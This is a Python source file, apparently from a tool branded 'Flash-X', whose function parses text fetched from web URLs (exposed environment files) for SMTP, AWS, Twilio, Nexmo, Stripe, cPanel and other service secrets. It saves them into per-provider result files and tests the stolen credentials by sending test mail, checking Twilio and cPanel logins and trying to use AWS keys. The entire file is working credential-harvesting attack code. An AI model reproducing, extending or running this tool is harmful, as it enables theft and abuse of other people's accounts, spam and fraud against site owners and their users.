from re import findall

def get_smtp(url,text):
  try:
    if "MAIL_HOST" in text:
      if "MAIL_HOST=" in text:
        mailhost = findall("\nMAIL_HOST=(.*?)\n", text)[0]
        try:
          mailport = findall("\nMAIL_PORT=(.*?)\n", text)[0]
        except:
          mailport = 587
        mailuser = findall("\nMAIL_USERNAME=(.*?)\n", text)[0]
        mailpass = findall("\nMAIL_PASSWORD=(.*?)\n", text)[0]
        if "MAIL_FROM" in text:
          mailfrom = findall("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]
        else:
          mailfrom = "unknown@unknown.com"
          
        build = 'URL: '+str(url)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)
        remover = str(build).replace('\r', '')
        if ".amazonaws.com" in text and aws() == "on":
          mailhost = findall("\nMAIL_HOST=(.*?)\n", text)[0]
          mailport = findall("\nMAIL_PORT=(.*?)\n", text)[0]
          mailuser = findall("\nMAIL_USERNAME=(.*?)\n", text)[0]
          mailpass = findall("\nMAIL_PASSWORD=(.*?)\n", text)[0]
          if "MAIL_FROM" in text:
            emailform = findall("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]
          else:
            emailform = "UNKNOWN"
          getcountry = findall('email-smtp.(.*?).amazonaws.com', mailhost)[0]
          
          build = 'URL: '+str(url)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAIL_FROM_ADDRESS: '+str(emailform)
          remover = str(build).replace('\r', '')
          print ("\033[1;40m[BY Flash-X] {} |   \033[1;32;40m amazonaws\n".format(str(url)))
          save = open('result/'+getcountry+'.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
          save2 = open('result/smtp_aws_ses.txt', 'a')
          save2.write(str(remover)+'\n\n')
          save2.close()
          try:
            sendtest(url,mailhost,mailport,mailuser,mailpass,emailform)
          except:
            print("\033[1;40m[BY Flash-X] {} |   \033[1;31;40mFailed Send\n".format(str(url)))

        elif "smtp.sendgrid.net" in str(mailhost) and sendgrid() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mSendgrid\n".format(str(url)))
          save = open('result/sendgrid.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "mailgun.org" in str(mailhost) and mailgun() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mmailgun\n".format(str(url)))
          save = open('result/mailgun.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "sparkpostmail.com" in str(mailhost) and sparkpostmail() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40msparkpostmail\n".format(str(url)))
          save = open('result/sparkpostmail.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "mandrillapp.com" in str(mailhost) and mandrillapp() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mmandrillapp\n".format(str(url)))
          save = open('result/mandrill.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "smtp-relay.gmail" in str(mailhost) and relay() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mrelay\n".format(str(url)))
          save = open('result/smtp-relay.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "sendinblue.com" in str(mailhost) and sendinblue() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40msendinblue\n".format(str(url)))
          save = open('result/sendinblue.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "kasserver.com" in str(mailhost):
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40msendinblue\n".format(str(url)))
          save = open('result/kasserver.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "zoho." in str(mailhost) and zoho() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mzoho\n".format(str(url)))
          save = open('result/zoho.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "1and1." in str(mailhost) and and1() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40m1and1\n".format(str(url)))
          save = open('result/1and1.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailhost == "smtp.office365.com" and office365() == "on" :
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40moffice365\n".format(str(url)))
          save = open('result/office365.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "zimbra" in str(mailhost) and zimbra() == "on" :
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mZimbra\n".format(str(url)))
          save = open('result/zimbra.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailuser != "null" and mailpass != "null" and mailhost!="smtp.mailtrap.io" or mailuser != "" and mailpass != "" and mailhost!="smtp.mailtrap.io" or mailhost!="smtp.mailtrap.io":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mSMTP Random\n".format(str(url)))
          save = open('result/SMTP_RANDOM.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "" or mailhost=="smtp.mailtrap.io":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;31;40mInvalid SMTP\n".format(str(url)))  
        try:
          sendtest(url,mailhost,mailport,mailuser,mailpass,mailfrom)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;31;40mFailed Send\n".format(str(url)))
    else:
      print("\033[1;40m[BY Flash-X] {} |   \033[1;31;40mFailed SMTP\n".format(str(url)))



    if "TWILIO_ACCOUNT_SID=" in text and twillio() == "on":
      acc_sid = findall('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
      try:
        phone = findall('\nTWILIO_NUMBER=(.*?)\n', text)[0]
      except:
        phone = ""
      auhtoken = findall('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]

      build = 'URL: '+url+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        twilliocheck(url,acc_sid,auhtoken,phone)
      except:
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mInvalid Twillio\n".format(url))
    elif "TWILIO_SID=" in text and twillio() == "on":
      acc_sid = findall('\nTWILIO_SID=(.*?)\n', text)[0]
      acc_key = findall('\nTWILIO_TOKEN=(.*?)\n', text)[0]
      try:
        acc_from = findall('\nTWILIO_FROM=(.*?)\n', text)[0]
      except:
        acc_from = ""
    
      build = 'URL: '+str(url)+'\nTWILIO_SID: '+str(acc_sid)+'\nTWILIO_TOKEN: '+str(acc_key)+'\nTWILIO_FROM: '+str(acc_from)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        twilliocheck(url,acc_sid,auhtoken,phone)
      except: 
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mInvalid Twillio\n".format(url))
    elif "ACCOUNT_SID=" in text and twillio() == "on":
      acc_sid = findall('\nACCOUNT_SID=(.*?)\n', text)[0]
      acc_key = findall('\nAUTH_TOKEN=(.*?)\n', text)[0]
      try:
        acc_from = findall('\nTwilio_Number=(.*?)\n', text)[0]
      except:
        acc_from = ""
      build = 'URL: '+str(url)+'\nTWILIO_SID: '+str(acc_sid)+'\nTWILIO_TOKEN: '+str(acc_key)+'\nTWILIO_FROM: '+str(acc_from)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        twilliocheck(url,acc_sid,auhtoken,phone)
      except:
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mInvalid Twillio\n".format(url))



    if 'AWS_ACCESS_KEY_ID=' in text and AWS_ACCESS_KEY() == "on":
      mailhost = findall("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
      mailport = findall("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
      mailuser = findall("\nAWS_DEFAULT_REGION=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nAWS_ACCESS_KEY_ID: '+str(mailhost)+'\nAWS_SECRET_ACCESS_KEY: '+str(mailport)+'\nAWS_DEFAULT_REGION: '+str(mailuser)
      build2 = str(mailhost)+'|'+str(mailport)+'|'+str(mailuser)
      remover = str(build).replace('\r', '')
      if str(mailuser) != "" and  str(mailport) !="":
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mAWS_ACCESS_KEY\n".format(str(url)))
        save = open('result/'+mailuser+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n')
        save3.close()
        try:
          autocreateses(url,mailhost,mailport,mailuser)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))
    elif 'AWS_KEY=' in text and AWS_KEY() == "on":
      mailhost = findall("\nAWS_KEY=(.*?)\n", text)[0]
      mailport = findall("\nAWS_SECRET=(.*?)\n", text)[0]
      mailuser = findall("\nAWS_REGION=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nAWS_ACCESS_KEY_ID: '+str(mailhost)+'\nAWS_SECRET_ACCESS_KEY: '+str(mailport)+'\nAWS_DEFAULT_REGION: '+str(mailuser)
      remover = str(build).replace('\r', '')
      build2 = str(mailhost)+'|'+str(mailport)+'|'+str(mailuser)
      if str(mailuser) != "" and  str(mailport) !="":
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mAWS_ACCESS_KEY\n".format(str(url)))
        save = open('result/'+mailuser+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n\n')
        save3.close()
        try:
          autocreateses(url,mailhost,mailport,mailuser)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))
    elif 'AWSAPP_KEY=' in text and AWS_KEY() == "on":
      mailhost = findall("\nAWSAPP_KEY=(.*?)\n", text)[0]
      mailport = findall("\nAWSAPP_SECRET=(.*?)\n", text)[0]
      mailuser = findall("\nAWSAPP_REGION=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nAWS_ACCESS_KEY_ID: '+str(mailhost)+'\nAWS_SECRET_ACCESS_KEY: '+str(mailport)+'\nAWS_DEFAULT_REGION: '+str(mailuser)
      remover = str(build).replace('\r', '')
      build2 = str(mailhost)+'|'+str(mailport)+'|'+str(mailuser)
      if str(mailuser) != "" and  str(mailport) !="":
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mAWS_ACCESS_KEY\n".format(str(url)))
        save = open('result/'+mailuser+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n\n')
        save3.close()
        try:
          autocreateses(url,mailhost,mailport,mailuser)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))
    elif 'SES_KEY=' in text and AWS_KEY() == "on":
      print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mAWS_ACCESS_KEY".format(str(url)))
      mailhost = findall("\nSES_KEY=(.*?)\n", text)[0]
      mailport = findall("\nSES_SECRET=(.*?)\n", text)[0]
      mailuser = findall("\nSES_REGION=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nSES_KEY: '+str(mailhost)+'\nSES_SECRET: '+str(mailport)+'\nSES_REGION: '+str(mailuser)
      remover = str(build).replace('\r', '')
      if str(mailuser) != "" and  str(mailport) !="":
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mAWS_ACCESS_KEY\n".format(str(url)))
        save = open('result/'+mailuser+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/ses_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        try:
          autocreateses(url,mailhost,mailport,mailuser)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))

    
    if 'MAILER_DSN=' in text:
      print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mSYMFONY\n".format(str(url)))
      mailhost = findall("\nMAILER_DSN=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nMAILER_DSN: '+str(mailhost)
      remover = str(build).replace('\r', '')
      if str(mailhost) != "" and  str(mailhost) !="smtp://localhost":
        save = open('result/symfony_mailer_dsn.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
    
    if "NEXMO" in text and NEXMO() == "on":
      if "NEXMO_KEY=" in text:
        try:
          nexmo_key = findall('\nNEXMO_KEY=(.*?)\n', text)[0]
        except:
          nexmo_key = ''
        try:
          nexmo_secret = findall('\nNEXMO_SECRET=(.*?)\n', text)[0]
        except:
          nexmo_secret = ''
        try:
          phone = findall('\nNEXMO_NUMBER=(.*?)\n', text)[0]
        except:
          phone = ''
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mNEXMO\n".format(str(url)))
        build = 'URL: '+str(url)+'\nnexmo_key: '+str(nexmo_key)+'\nnexmo_secret: '+str(nexmo_secret)+'\nphone: '+str(phone)
        remover = str(build).replace('\r', '')
        save = open('result/NEXMO.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        try:
          nexmosend(url,nexmo_key,nexmo_secret)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mINVALI NEXMO\n".format(str(url)))
      elif "NEXMO_API_KEY=" in text:
        try:
          nexmo_key = findall('\nNEXMO_API_KEY=(.*?)\n', text)[0]
        except:
          nexmo_key = ''
        try:
          nexmo_secret = findall('\nNEXMO_API_SECRET=(.*?)\n', text)[0]
        except:
          nexmo_secret = ''
        try:
          phone = findall('\nNEXMO_API_NUMBER=(.*?)\n', text)[0]
        except:
          phone = ''
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mNEXMO\n".format(str(url)))
        build = 'URL: '+str(url)+'\nnexmo_key: '+str(nexmo_key)+'\nnexmo_secret: '+str(nexmo_secret)+'\nphone: '+str(phone)
        remover = str(build).replace('\r', '')
        save = open('result/NEXMO.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        try:
          nexmosend(url,nexmo_key,nexmo_secret)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mINVALI NEXMO\n".format(str(url)))


    if "EXOTEL_API_KEY" in text and EXOTEL() == "on":
      if "EXOTEL_API_KEY=" in text:
        try:
          exotel_api = findall('\nEXOTEL_API_KEY=(.*?)\n', text)[0]
        except:
          exotel_api = ''
        try:
          exotel_token = findall('\nEXOTEL_API_TOKEN=(.*?)\n', text)[0]
        except:
          exotel_token = ''
        try:
          exotel_sid = findall('\nEXOTEL_API_SID=(.*?)\n', text)[0]
        except:
          exotel_sid = ''
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mEXOTEL\n".format(str(url)))
        build = 'URL: '+str(url)+'\nEXOTEL_API_KEY: '+str(exotel_api)+'\nEXOTEL_API_TOKEN: '+str(exotel_token)+'\nEXOTEL_API_SID: '+str(exotel_sid)
        remover = str(build).replace('\r', '')
        save = open('result/EXOTEL.txt', 'a')
        save.write(remover+'\n\n')
        save.close()


    if "ONESIGNAL_APP_ID" in text and ONESIGNAL() == "on":
      if "ONESIGNAL_APP_ID=" in text:
        try:
          onesignal_id = findall('\nONESIGNAL_APP_ID=(.*?)\n', text)[0]
        except:
          onesignal_id = ''
        try:
          onesignal_token = findall('\nONESIGNAL_REST_API_KEY=(.*?)\n', text)[0]
        except:
          onesignal_id = ''
        try:
          onesignal_auth = findall('\nONESIGNAL_USER_AUTH_KEY=(.*?)\n', text)[0]
        except:
          onesignal_auth = ''
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mONESIGNAL\n".format(str(url)))
        build = 'URL: '+str(url)+'\nONESIGNAL_APP_ID: '+str(onesignal_id)+'\nONESIGNAL_REST_API_KEY: '+str(onesignal_token)+'\nONESIGNAL_USER_AUTH_KEY: '+str(onesignal_auth)
        remover = str(build).replace('\r', '')
        save = open('result/ONESIGNAL.txt', 'a')
        save.write(remover+'\n\n')
        save.close()

    if "TOKBOX_KEY_DEV" in text and TOKBOX() == "on":
      if "TOKBOX_KEY_DEV=" in text:
        try:
          tokbox_key = findall('\nTOKBOX_KEY_DEV=(.*?)\n', text)[0]
        except:
          tokbox_key = ''
        try:
          tokbox_secret = findall('\nTOKBOX_SECRET_DEV=(.*?)\n', text)[0]
        except:
          tokbox_secret = ''
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mTOKBOX\n".format(str(url)))
        build = 'URL: '+str(url)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
        remover = str(build).replace('\r', '')
        save = open('result/TOKBOX.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
    elif "TOKBOX_KEY" in text and TOKBOX() == "on":
      if "TOKBOX_KEY=" in text:
        try:
          tokbox_key = findall('\nTOKBOX_KEY=(.*?)\n', text)[0]
        except:
          tokbox_key = ''
        try:
          tokbox_secret = findall('\nTOKBOX_SECRET=(.*?)\n', text)[0]
        except:
          tokbox_secret = ''
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mTOKBOX\n".format(str(url)))
        build = 'URL: '+str(url)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
        remover = str(build).replace('\r', '')
        save = open('result/TOKBOX.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
    
    
    if "CPANEL_HOST=" in text:
      try:
        cipanel_host = findall('\nCPANEL_HOST=(.*?)\n', text)[0]
      except:
        cipanel_host = ''
      try:
        cipanel_port = findall('\nCPANEL_PORT=(.*?)\n', text)[0]
      except:
        cipanel_port = ''
      try:
        cipanel_user = findall('\nCPANEL_USERNAME=(.*?)\n', text)[0]
        cuser = findall('\nDB_USERNAME=(.*?)\n', text)[0]
        if "_" in cuser:
          cuser = cuser.split("_")[0]
      except:
        cipanel_user = ''
      try:
        cipanel_pw = findall('\nCPANEL_PASSWORD=(.*?)\n', text)[0]
        cpasswd = findall('\nDB_USERNAME=(.*?)\n', text)[0]
      except:
        cipanel_pw = ''
      if cuser != '' and cpasswd != '':
        checkcpanel(url,cuser,cpasswd)
      elif cipanel_user != '' and cipanel_pw != '':
        checkcpanel(url,cipanel_user,cipanel_pw)
        
      build = 'URL: '+str(url)+'\nCPANEL_HOST: '+str(cipanel_host)+'\nCPANEL_PORT: '+str(cipanel_port)+'\nCPANEL_USERNAME: '+str(cipanel_user)+'\nCPANEL_PASSWORD: '+str(cipanel_pw)
      remover = str(build).replace('\r', '')
      save = open('result/CPANEL.txt', 'a')
      save.write(remover+'\n\n')
      save.close()

    if "STRIPE_KEY=" in text:
      try:
        stripe_1 = findall("\nSTRIPE_KEY=(.*?)\n", text)[0]
      except:
        stripe_1 = ''
      try:
        stripe_2 = findall("\nSTRIPE_SECRET=(.*?)\n", text)[0]
      except:
        stripe_2 = ''
      build = 'URL: '+str(url)+'\nSTRIPE_KEY: '+str(stripe_1)+'\nSTRIPE_SECRET: '+str(stripe_2)
      remover = str(build).replace('\r', '')
      save = open('result/STRIPE_KEY.txt', 'a')
      save.write(remover+'\n\n')
      save.close()

  except Exception as e:
    pass